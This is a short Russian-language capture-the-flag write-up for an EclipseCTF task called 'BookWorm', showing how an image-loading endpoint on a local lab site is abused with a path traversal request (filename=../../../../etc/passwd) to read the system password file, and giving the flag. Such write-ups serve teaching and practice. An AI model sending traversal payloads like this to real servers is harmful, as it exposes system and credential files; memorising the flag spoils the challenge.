# BookWorm

***Описание***: Как много книг ты прочитал за год? Я сделал подборку своих избранных книг, посмотри, может тебе они тоже понравятся!

Ссылка: `http://localhost:8080`

Формат: EclipseCTF{...}

---
### Решение

Переходим на сайт:

![ScreenShot](Assets/For_Tasks/BookWorm-1.png)

Смотрим, как подгружаются картинки на сайт:

![ScreenShot](Assets/For_Tasks/BookWorm-2.png)

```
src="/api/book/loadImage?filename=0.png"
```

Прочитаем `/etc/passwd`, эксплуатируя `Path Traversal`:

```
http://localhost:8080/api/book/loadImage?filename=../../../../etc/passwd
```

![ScreenShot](Assets/For_Tasks/BookWorm-3.png)

---

***Флаг***: `EclipseCTF{../e7c/p455wd_hun73r}`